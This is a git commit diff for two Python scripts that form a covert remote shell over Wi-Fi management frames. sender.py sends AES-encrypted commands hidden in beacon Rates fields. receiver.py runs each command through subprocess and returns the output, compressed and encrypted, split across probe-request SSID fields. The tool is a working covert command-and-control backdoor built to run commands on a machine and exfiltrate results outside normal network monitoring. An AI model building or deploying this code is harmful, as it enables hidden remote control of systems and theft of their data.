cd34cdf709e6864739728737d83fe3c80f271e7e
Joao Pena Gil <somethingsyouneverforget@gmail.com>
2015-08-22 15:28:08 +0100

    added encryption and multi-packet responses

--- receiver.py
+++ receiver.py
@@ -1,53 +1,101 @@
 #!/usr/bin/python
 
 # python receiver.py mon0
-
+import zlib
+import base64
+from Crypto.Cipher import AES
+from Crypto import Random
 import subprocess
 import logging
 import time
 import base64
 import sys
-
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import * 
 
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+class AESCipher:
+    def __init__( self, key ):
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt( self, raw ):
+        raw = pad(raw)
+        iv = Random.new().read( AES.block_size )
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return base64.b64encode( iv + cipher.encrypt( raw ) ) 
+
+    def decrypt( self, enc ):
+        enc = base64.b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return unpad(cipher.decrypt( enc[16:] ))
+
+aes=AESCipher("password") #change this password when deploying
 interface=sys.argv[1] #mon0
 
 conf.iface=interface
 
 def executeHere(cmd):
-	cmd = base64.b64decode(cmd)
+	try:
+		aescommand = base64.b64decode(cmd)
+		command = aes.decrypt(aescommand)
+	except Exception, e:
+		print str(e)
+		print "Received command with wrong AES key"
+		return
+	cmd = command
+	if len(cmd)==0:
+		print "Received command with wrong AES key"
+		return
 	print "Command: "+cmd
 	cmd = cmd.split(" ")
 	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	out, err = p.communicate()
-	print "Command Output:"
 	out = out.rstrip("\n")
-	print out
-	print "Output Length: "+str(len(out))
-	print "Command Error:"
-	print err
-	print "Error Length: "+str(len(err))
-	print "Output Base64 Length: "+str(len(base64.b64encode(out)))
-	probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=base64.b64encode(out))/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
-
-	print "Sleeping for 5 seconds..."
-	time.sleep(5)
-	print "Sending output in Probe Request..."
-	try:
-		sendp(probereq, iface=interface, verbose=0)
-	except Exception,e:
-		print "Exception: "+str(e)
-		print "Sending caught exception..."
-		exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=base64.b64encode(str(e)))/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
-		sendp(exprobereq, iface=interface, verbose=0)
+	print "Output: ",out
+	print "Encrypted:",aes.encrypt(zlib.compress(out))
+	print "Plain:",aes.decrypt(aes.encrypt(out))
+	payload=aes.encrypt(zlib.compress(out))
+	rlen=len(payload)
+	if (rlen>255):
+		line=payload
+		n=240
+		parts=[line[i:i+n] for i in range(0, len(line), n)]
+		i=1
+		for part in parts:
+			try:
+				payload="PART"+str(i)+"/"+str(len(parts))+"|"
+				payload+=part
+				probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
+				sendp(probereq, iface=interface, verbose=0)
+			except Exception,e:
+				print "Exception: "+str(e)
+				print "Sending caught exception..."
+				payload=aes.encrypt(zlib.compress(str(e)))
+				exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
+				sendp(exprobereq, iface=interface, verbose=0)
+			i+=1
+		
+	else:
+		try:
+			probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
+			sendp(probereq, iface=interface, verbose=0)
+		except Exception,e:
+			print "Exception: "+str(e)
+			print "Sending caught exception..."
+			payload=aes.encrypt(zlib.compress(str(e)))
+			exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
+			sendp(exprobereq, iface=interface, verbose=0)
 
 def packets(pkt):
 	try:
 		if pkt.haslayer(Dot11):
 			if pkt.type == 0 and pkt.subtype == 8 and pkt.info == "" : # if management frame and beacon and SSID is blank
 				if pkt.addr2 == "11:22:33:44:55:66":
-					print "AP MAC: %s | SSID: %s | Rates: %s" % (pkt.addr2, pkt.info, (pkt[Dot11Elt:2].info))
+#					print "AP MAC: %s | SSID: %s | Rates: %s" % (pkt.addr2, pkt.info, (pkt[Dot11Elt:2].info))
 					#print ':'.join(x.encode('hex') for x in pkt[Dot11Elt:2].info)
 					executeHere(str(pkt[Dot11Elt:2].info))
 					return True
@@ -58,6 +106,6 @@ def packets(pkt):
 while 1:
 	try:
 		print "\nSniffing for packets..."
-		sniff(iface=interface, stop_filter=packets)
+		sniff(iface=interface, stop_filter=packets, store=0)
 	except Exception,e:
 		print "Exception: "+str(e)
--- sender.py
+++ sender.py
@@ -1,28 +1,80 @@
-#!/usr/bin/python
+#!/usr/bin/python2.7
 
 # python sender.py mon1
-
+import zlib
+from Crypto.Cipher import AES
+from Crypto import Random
 import logging
 import base64
-import sys
-
+import sys,hashlib
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+class AESCipher:
+    def __init__( self, key ):
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt( self, raw ):
+        raw = pad(raw)
+        iv = Random.new().read( AES.block_size )
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return base64.b64encode( iv + cipher.encrypt( raw ) ) 
+
+    def decrypt( self, enc ):
+        enc = base64.b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return unpad(cipher.decrypt( enc[16:] ))
+
+
 interface=sys.argv[1] #mon1
 verbose=0
+aes=AESCipher("password") #change this password to match receiver.py
 
 conf.verbose=verbose
 conf.iface=interface
 ssid=""
+global msg,msglen
+msg=""
+msglen=0
 
 def sniffProbe(p):
+	global msg,msglen
 	if p.haslayer(Dot11):
 		if p.type == 0 and p.subtype == 4: # if management frame and probe-request
 			if p.addr2 == "11:22:33:44:55:66":
-				#print "wow"
-				print base64.b64decode(p.info),
-				return True
+				if ("PART"==p.info[:4]):
+					piecepos=p.info.index("/")
+					piece=p.info[4:piecepos]
+					lenpos=p.info.index('|')
+					msglen=p.info[piecepos+1:lenpos]
+					sys.stdout.write("Receiving long message "+str(piece)+"/"+str(msglen)+"\r")
+					sys.stdout.flush()
+					if (piece==msglen):
+						print ""
+						msg+=p.info[lenpos:]
+						print msg
+						unenc=aes.decrypt(msg)
+						try:
+							uncomp=zlib.decompress(unenc)
+							print uncomp
+						except:
+							print "ERROR - Wrong Password"
+						msg=""
+						msglen=0
+					else:
+						msg+=p.info[lenpos+1:]
+				else:
+					unenc=aes.decrypt(p.info)
+					try:
+						uncomp=zlib.decompress(unenc)
+						print uncomp
+					except:
+						print "ERROR - Wrong Password"
 
 def SendRates(rates):
 	frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2="11:22:33:44:55:66",addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",len=len(ssid),info=ssid)/Dot11Elt(ID="Rates",info=rates)/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
@@ -34,8 +86,8 @@ while cmd != "exit":
 	print "\n\nshell>",
 	cmd = raw_input()
 	if cmd != "exit":
-		SendRates(base64.b64encode(cmd))
+		command=base64.b64encode(aes.encrypt(cmd))
+		SendRates(command)
 
 print "\nNice meeting you. Bye!!\n"
 
-#sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",len=len("asdhello"),info="asdhello")/Dot11Elt(ID="Rates",info="testing")/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
